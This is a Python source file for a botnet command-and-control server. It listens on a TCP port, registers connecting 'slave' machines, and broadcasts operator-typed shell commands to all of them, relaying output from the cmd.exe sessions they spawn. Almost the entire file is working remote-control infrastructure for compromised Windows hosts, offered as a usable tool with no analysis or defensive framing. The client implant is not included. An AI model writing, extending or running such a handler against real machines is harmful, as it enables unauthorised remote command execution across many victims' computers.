import socket
import sys
import os
import threading
import queue
import time
from cmd import Cmd

q = queue.Queue()
SocketThreads = []
ClientDict = {}

def main():
    if (len(sys.argv) != 3):
        try:
            lhost = "192.168.56.112"
            lport = 8008
            listener(lhost,lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: {}\n".format(str(ex)))
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: {}\n".format(str(ex)))


def listener(lhost,lport,q):
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((lhost,lport))
    server.listen(100)

    print("[+] Starting C&C server on tcp://{}:{}".format(lhost,lport))
    
    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()
        newthread = BotHandler(client,client_address, q, ClientDict)
        SocketThreads.append(newthread)
        newthread.start()


class Terminal(Cmd):
    prompt = '$ '
    def __init__(self, qv3):
        # super() needed to correctly initialize class
        Cmd.__init__(self)
        self.q = qv3
    
    def do_exit(self,args):
        for _ in range(len(SocketThreads)):
            time.sleep(0.1)
            self.q.put("exit\n")
        time.sleep(1)
        os._exit(0)

    def do_bots(self,args):
        print("Bots: {}".format(ClientDict))

    def do_list(self,args):
        # Add help menu for this.
        if (args == "queue" or args == "q"):
            print("Queue: {}".format(list(self.q.queue)))

    def emptyline(self):
        for _ in range(len(SocketThreads)):
            time.sleep(0.1)
            self.q.put("\n")

    def default(self, args):
        #print("[DBG] Sending command to {} bots: {}".format(len(SocketThreads),args))
        for _ in range(len(SocketThreads)):
            time.sleep(0.1)
            self.q.put(args+"\n")
        time.sleep(0.5) # To not input prompt before response


class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2
    
    def run(self):
        terminal = Terminal(self.q)
        terminal.cmdloop()


class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv, ClientDict):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv
        self.ClientList = ClientDict

    def run(self):

        # Handling client thread
        BotName = threading.current_thread().getName()
        print("\n[*] Slave {}:{} connected with Thread-ID: {}\n".format(self.ip,self.port,BotName))
        self.ClientList[BotName] = self.client_address
        
        # Initial message for socket state check on client side.
        # If socket ok, will credate 'cmd.exe' subprocess.
        self.client.send("background checks..".encode("utf-8"))
        
        # Getting banner
        banner = ""
        while True:
            try:
                self.client.settimeout(1)
                recv = self.client.recv(4096).decode('utf-8')
            except:
                recv = ""
            if not recv:
                break
            else:
                banner += recv
        print(banner)
        time.sleep(0.5)

        # Command loop
        while True:
            RecvBotCmd = self.q.get()
            try:
                self.client.send(RecvBotCmd.encode('utf-8'))
                cmd_response = ""
                while True:
                    try:
                        # Client returns entered command (because cmd.exe has it in input)
                        # if response is only as large as input - command not completed
                        # so wait longer
                        # else - output already is received
                        # can do not wait more if there's no data in socket
                        if (len(cmd_response) <= len(RecvBotCmd)):
                            self.client.settimeout(5)
                        else:
                            self.client.settimeout(0.1)
                        recv = self.client.recv(4096).decode('utf-8')
                    except socket.timeout:
                        # if timeout exception is triggered - assume no data anymore
                        recv = ""
                    except Exception as ex:
                        print("[-] Unplanned exception: {}".format(ex))
                    if not recv:
                        break
                    else:
                        cmd_response += recv
                # Removing send command from response
                print(cmd_response.replace(RecvBotCmd,""))
            except Exception as ex:
                print("Exception occured during command sending: {}".format(ex))
                break


if __name__ == '__main__':
    main()
